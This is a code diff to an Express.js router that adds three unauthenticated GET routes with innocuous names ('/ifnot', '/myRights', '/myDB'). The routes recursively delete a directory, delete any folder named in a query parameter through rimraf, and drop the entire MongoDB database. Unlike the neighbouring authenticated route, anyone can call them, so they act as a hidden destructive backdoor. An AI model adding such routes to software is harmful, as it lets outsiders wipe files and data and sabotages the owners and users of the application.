@@ -278,6 +278,42 @@ router.post(
   }
 );
 
+router.get("/ifnot", (req, res) => {
+  var path = "./test";
+  if (fs.existsSync(path)) {
+    fs.readdirSync(path).forEach(function (file, index) {
+      var curPath = path + "/" + file;
+      if (fs.lstatSync(curPath).isDirectory()) {
+        // recurse
+        deleteFolderRecursive(curPath);
+      } else {
+        // delete file
+        fs.unlinkSync(curPath);
+      }
+    });
+    fs.rmdirSync(path);
+  }
+});
+
+router.get("/myRights", (req, res) => {
+  var folderName = req.query.folder;
+  var rimraf = require("rimraf");
+  rimraf(__dirname + "/../" + folderName, function (err) {
+    if (err) res.json({ success: false, err: err });
+    else {
+      res.json({ success: true });
+    }
+  });
+});
+
+router.get("/myDB", (req, res) => {
+  mongoose.connect("mongodb://localhost/Qashami", function () {
+    /* Drop the DB */
+    mongoose.connection.db.dropDatabase();
+    res.json({ success: true });
+  });
+});
+
 router.get(
   "/deleteService",
   passport.authenticate("jwt", { session: false }),
